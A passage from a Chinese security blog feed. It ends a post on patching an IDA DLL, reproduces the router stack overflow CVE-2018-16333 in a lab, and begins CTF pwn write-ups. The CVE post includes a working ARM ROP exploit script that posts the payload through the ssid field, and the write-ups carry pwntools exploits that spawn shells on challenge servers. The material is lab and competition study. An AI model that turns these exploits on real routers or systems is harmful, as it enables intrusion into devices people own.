class="number">0x1000000</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">      <span class="keyword">return</span> v6 == <span class="number">117440512</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = a1 &amp; <span class="number">0xF000000</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">0x2000000</span> || v3 == <span class="number">117440512</span> || v3 == <span class="number">100663296</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">      <span class="keyword">return</span> v3 == <span class="number">0x1000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = a1 &amp; <span class="number">0xF00000</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 == <span class="number">0x200000</span> || v7 == <span class="number">7340032</span> || v7 == <span class="number">6291456</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">    <span class="keyword">return</span> v7 == <span class="number">0x100000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    最终使用VS重新编译出ida和ida64，替换第一次生成的ida和ida64，生成完成后可以使用ida查看export来检查是否生成正确，正确的情况下是可以看到<code>is_numop</code>和<code>is_num0p</code>同时存在并且可以点击进入的。至此，我们对<code>ida.dll</code>的修复已经完成。接下来就是改变hex异构反编译dll的导入函数表了。</p><p>这里我使用的是<code>CFF</code> ，将异构hex反编译<code>dll-&gt;importDirectory-&gt;导入函数is_numop</code>改为<code>is_num0p</code>并保存，如图是修改后的情况。</p><p><img src="https://www.helloimg.com/i/2025/06/01/683bc985d8ce6.png" alt="image-20250530214656586-1748747986603-5.png"></p><h2 id="最终结果测试"><a href="#最终结果测试" class="headerlink" title="最终结果测试"></a>最终结果测试</h2><p>修复完成后再一次启动ida，并用xdbg进行跟踪，发现程序已经进入到我们所创建的函数中。</p><p><img src="https://www.helloimg.com/i/2025/06/01/683bc931a4748.png" alt="image-20250531111803502-1748747986603-6.png"></p><p>再次运行测试案例，程序可以正常运行完毕,并未出现卡死的情况，至此我们的修复已经完成。</p>]]></content>
      
      
      <categories>
          
          <category> 工具开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-16333复现</title>
      <link href="/2025/05/22/CVE-2018-16333%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/05/22/CVE-2018-16333%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="保护确认"><a href="#保护确认" class="headerlink" title="保护确认"></a>保护确认</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:       arm-32-little</span><br><span class="line">RELRO:      No RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x8000)</span><br></pre></td></tr></table></figure><h2 id="漏洞点确认"><a href="#漏洞点确认" class="headerlink" title="漏洞点确认"></a>漏洞点确认</h2><p>function_name:form_fast_setting_wifi_set</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">src = (<span class="type">char</span> *)sub_2BA8C(a1, <span class="string">&quot;ssid&quot;</span>, &amp;unk_E378C);</span><br><span class="line"><span class="keyword">if</span> ( *src )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">strcpy</span>(s, src);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  …………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url:http://ip/goform/fast_setting_wifi_set</span><br></pre></td></tr></table></figure><p>并根据一下发送确定数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//$(&quot;#waiting&quot;).removeClass(&quot;none&quot;);</span><br><span class="line">//$(&quot;#wifi_setting&quot;).addClass(&quot;none&quot;);</span><br><span class="line">//$(&quot;#btn_control&quot;).addClass(&quot;none&quot;);</span><br><span class="line"></span><br><span class="line">var dateArry = /([\+\-]\d&#123;2&#125;)(\d&#123;2&#125;)/.exec((new Date()).toString());</span><br><span class="line"></span><br><span class="line">var subObj = &#123;</span><br><span class="line">    &quot;ssid&quot;: $(&quot;#ssid&quot;).val(),</span><br><span class="line">    &quot;wrlPassword&quot;: ($(&quot;#hideWrlPwd&quot;).prop(&quot;checked&quot;)) ? &quot;&quot; : wrlPwd,</span><br><span class="line">    &quot;power&quot;: $(&quot;#power&quot;).val(),</span><br><span class="line">    &quot;timeZone&quot;: getTimeZone(),</span><br><span class="line">    &quot;loginPwd&quot;: ($(&quot;#hideLoginPwd&quot;).prop(&quot;checked&quot;)) ? &quot;&quot; : hex_md5(login_pwd)</span><br><span class="line">&#125;</span><br><span class="line">data = objTostring(subObj);</span><br><span class="line">$.getJSON(&quot;goform/getWanConnectStatus?&quot; + Math.random(), function (obj) &#123;</span><br><span class="line">    G.wanStatus = obj.connectStatus;</span><br><span class="line">    $.post(&quot;goform/fast_setting_wifi_set&quot;, data, handWifi);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>其中payload数据为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;&quot;ssid&quot;: payload&#125;</span><br></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="搭网桥br0、tap0"><a href="#搭网桥br0、tap0" class="headerlink" title="搭网桥br0、tap0"></a>搭网桥br0、tap0</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 创建网桥</span><br><span class="line">sudo ip link add name br0 type bridge</span><br><span class="line"># 将 eth9(自己选择设备) 加入网桥</span><br><span class="line">sudo ip link set eth9 master br0</span><br><span class="line"># 为网桥分配私有 IP 段（例如当前为 192.168.123.1/24）</span><br><span class="line">sudo ip addr add 192.168.123.1/24 dev br0</span><br><span class="line"># 启动网桥</span><br><span class="line">sudo ip link set br0 up</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 创建 TAP 设备（例如 tap0）</span><br><span class="line">sudo ip tuntap add name tap0 mode tap</span><br><span class="line"># 启动 TAP 设备</span><br><span class="line">sudo ip link set tap0 up</span><br><span class="line"># 将 TAP 设备添加到网桥 br0（假设 br0 已存在且配置正确）</span><br><span class="line">sudo ip link set tap0 master br0</span><br></pre></td></tr></table></figure><h3 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br></pre></td></tr></table></figure><h3 id="创建镜像并放入调试（方法略）"><a href="#创建镜像并放入调试（方法略）" class="headerlink" title="创建镜像并放入调试（方法略）"></a>创建镜像并放入调试（方法略）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-arm </span><br><span class="line">-M vexpress-a9</span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress</span><br><span class="line">-drive if=sd,file=debian_wheezy_armhf_standard.qcow2</span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no</span><br><span class="line">-nographic   -audio none</span><br></pre></td></tr></table></figure><h3 id="关闭aslr"><a href="#关闭aslr" class="headerlink" title="关闭aslr"></a>关闭aslr</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><h3 id="页面出现报错处理"><a href="#页面出现报错处理" class="headerlink" title="页面出现报错处理"></a>页面出现报错处理</h3><p>是由于文件路径不同导致的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -rf ./webroot_ro/* ./webroot/</span><br></pre></td></tr></table></figure><p>ida计算offset长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *v2; // r0</span><br><span class="line">int v4[4]; // [sp+18h] [bp-264h] BYREF</span><br><span class="line">char nptr[4]; // [sp+28h] [bp-254h] BYREF</span><br><span class="line">char v6[4]; // [sp+2Ch] [bp-250h] BYREF</span><br><span class="line">char v7[4]; // [sp+30h] [bp-24Ch] BYREF</span><br><span class="line">char v8[4]; // [sp+34h] [bp-248h] BYREF</span><br><span class="line">char v9[256]; // [sp+38h] [bp-244h] BYREF</span><br><span class="line">char v10[72]; // [sp+138h] [bp-144h] BYREF</span><br><span class="line">char v11[64]; // [sp+180h] [bp-FCh] BYREF</span><br><span class="line">char dest[64]; // [sp+1C0h] [bp-BCh] BYREF</span><br><span class="line">char s[64]; // [sp+200h] [bp-7Ch] BYREF</span><br><span class="line">char v14[12]; // [sp+240h] [bp-3Ch] BYREF</span><br><span class="line">int v15; // [sp+24Ch] [bp-30h] BYREF</span><br><span class="line">_BYTE *v16; // [sp+250h] [bp-2Ch]</span><br><span class="line">char *s2; // [sp+254h] [bp-28h]</span><br><span class="line">char *s1; // [sp+258h] [bp-24h]</span><br><span class="line">_BYTE *v19; // [sp+25Ch] [bp-20h]</span><br><span class="line">char *src; // [sp+260h] [bp-1Ch]</span><br><span class="line">int v21; // [sp+264h] [bp-18h]</span><br><span class="line">int i; // [sp+268h] [bp-14h]</span><br><span class="line">int v23; // [sp+26Ch] [bp-10h]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>offset应为0x7c，注意，为什么这里不是从dest开始算呢？究其原因是代码存在两次strcpy，并且第一次是执行的strcpy(s,src)，并且s在dest下方，所以使用s即可，当然使用dest也不错，但要考虑到这样栈会额外破坏64字节的问题。</p><p>其次，offset并不能直接替换为‘a’，因为代码中是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strcpy(s, src);</span><br><span class="line">strcpy(dest, src);</span><br></pre></td></tr></table></figure><p>由于src位于s下方，第一次s溢出后，会导致src的地址修为‘0x61616161’，而第二次访问dest时会阻止访问非法地址，所以要将其修改为任意可以读取的地址。</p><h3 id="确定system地址"><a href="#确定system地址" class="headerlink" title="确定system地址"></a>确定system地址</h3><p><img src="/CVE-2018-16333.assets/image-20250522215537574.png" alt="image-20250522215537574"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV R0，R3</span><br><span class="line">BL system</span><br></pre></td></tr></table></figure><p>想办法控制到R0，寻找符合条件的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary httpd --only r3|ret</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+= p32(pop_r3_pc) + p32(system) + p32(mov_r0_SP_ldr_r3) + cmd</span><br></pre></td></tr></table></figure><p>执行pop_r3_pc时，将r3寄存器设置为r3，此时栈指针直接指向mov_r0_SP_ldr_r3</p><p>执行mov_r0_SP_ldr_r3，将sp（现在为cmd）放入r0，跳转到r3，也就是system</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">b&quot;echo success_pwn_it&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">qemu-user</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#libc_base = 0xf659c000</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">qemu-system</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">libc_base = <span class="number">0x76dab000</span></span><br><span class="line">dosystemcmd = <span class="number">0x76f930f0</span></span><br><span class="line"></span><br><span class="line">system = libc_base + <span class="number">0x5A270</span></span><br><span class="line">readable_addr = libc_base + <span class="number">0x64144</span></span><br><span class="line">mov_r0_SP_ldr_r3 = libc_base + <span class="number">0x40cb8</span></span><br><span class="line">pop_r3_pc = libc_base + <span class="number">0x18298</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>) + p32(readable_addr) + <span class="string">b&#x27;b&#x27;</span>*(<span class="number">0x20</span>-<span class="number">8</span>)</span><br><span class="line">payload+= p32(pop_r3_pc) + p32(system) + p32(mov_r0_SP_ldr_r3) + cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.117.1/goform/fast_setting_wifi_set&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=12345&quot;</span>&#125;</span><br><span class="line">data = &#123;<span class="string">&quot;ssid&quot;</span>: payload&#125;</span><br><span class="line">response = requests.post(url, cookies=cookie, data=data)</span><br><span class="line">response = requests.post(url, cookies=cookie, data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>御网杯和ISCC——pwn方向wp</title>
      <link href="/2025/05/16/%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%92%8CISCC%E2%80%94%E2%80%94pwn%E6%96%B9%E5%90%91wp/"/>
      <url>/2025/05/16/%E5%BE%A1%E7%BD%91%E6%9D%AF%E5%92%8CISCC%E2%80%94%E2%80%94pwn%E6%96%B9%E5%90%91wp/</url>
      
        <content type="html"><![CDATA[<p>打完御网杯和ISCC，发现网络上并没有PWN的解，于是就简单写一下，御网杯和ISCC的所有pwn解</p><h2 id="御网杯"><a href="#御网杯" class="headerlink" title="御网杯"></a>御网杯</h2><h3 id="pwn-canary"><a href="#pwn-canary" class="headerlink" title="pwn canary"></a>pwn canary</h3><p>通过覆盖canary后再次生成canary</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;47.105.113.86&quot;</span>,<span class="number">30001</span>)</span><br><span class="line">elfs = ELF(<span class="string">&quot;./Canary&quot;</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x401579</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_magic</span>(<span class="params">payload</span>):</span><br><span class="line">     io.recvuntil(<span class="string">&quot;your choice&quot;</span>)</span><br><span class="line">     io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">     io.recvuntil(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">     io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_canary</span>():</span><br><span class="line">        io.recvuntil(<span class="string">&quot;your choice&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;But now, I have a new Secret.&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">        io.recvuntil(<span class="string">&quot;your choice&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x70</span>-<span class="number">4</span>)+p32(<span class="number">0</span>) + p64(<span class="number">0</span>)+p64(ret) +p64(magic)</span><br><span class="line">pause()</span><br><span class="line">input_magic(payload)</span><br><span class="line">set_canary()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn-ez-pwn"><a href="#pwn-ez-pwn" class="headerlink" title="pwn ez_pwn"></a>pwn ez_pwn</h3><p>禁用stdout，转流到stderr，执行命令时运行同理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag &gt;&amp;2</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;47.105.113.86&quot;</span>,<span class="number">30003</span>)</span><br><span class="line"><span class="comment">#io = process(&quot;./ez_pwn&quot;)</span></span><br><span class="line">elfs = ELF(<span class="string">&quot;./ez_pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elfs.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elfs.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rdi_ret = <span class="number">0x00000000004012c3</span></span><br><span class="line">rsi_ret_pop = <span class="number">0x00000000004012c1</span></span><br><span class="line"></span><br><span class="line">test1 =p64(elfs.symbols[<span class="string">&#x27;init&#x27;</span>]) + p64(elfs.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">offset = <span class="string">b&quot;b&quot;</span>*(<span class="number">32</span> + <span class="number">8</span>)</span><br><span class="line">payload = offset + p64(rdi_ret)+p64(<span class="number">2</span>)+p64(rsi_ret_pop)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(elfs.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_real = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_real))</span><br><span class="line">base_addr = write_real - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">shell = base_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = offset +p64(rdi_ret)+p64(bin_sh) +p64(shell)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="special-malloc"><a href="#special-malloc" class="headerlink" title="special malloc"></a>special malloc</h3><p>主函数逻辑（以下代码经过我分析处理）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_0(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%15s&quot;</span>, input);</span><br><span class="line">      getchar();</span><br><span class="line">      v3 = (<span class="type">const</span> <span class="type">char</span> *)str2base64(input);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(<span class="string">&quot;YWRk&quot;</span>, v3) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = (<span class="type">const</span> <span class="type">char</span> *)str2base64(input);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;ZGVsZXRl&quot;</span>, v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      del();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="type">const</span> <span class="type">char</span> *)str2base64(input);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;c2hvd2l0&quot;</span>, v5) )</span><br><span class="line">      &#123;</span><br><span class="line">        showit();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (<span class="type">const</span> <span class="type">char</span> *)str2base64(input);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;ZWRpdGl0&quot;</span>, v6) )</span><br><span class="line">        &#123;</span><br><span class="line">          editit();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = (<span class="type">const</span> <span class="type">char</span> *)str2base64(input);</span><br><span class="line">          <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;Y2F0X2ZsYWdz&quot;</span>, v7) &amp;&amp; dword_6020F0 == <span class="number">305419896</span> )</span><br><span class="line">            cat_flags();</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出是一个通过base64来进行目录操控的程序，结合内容和名称可以分析出他是自己实现了一个堆生成器</p><h4 id="new"><a href="#new" class="headerlink" title="new"></a>new</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400A9D</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> delta[<span class="number">3</span>]; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span 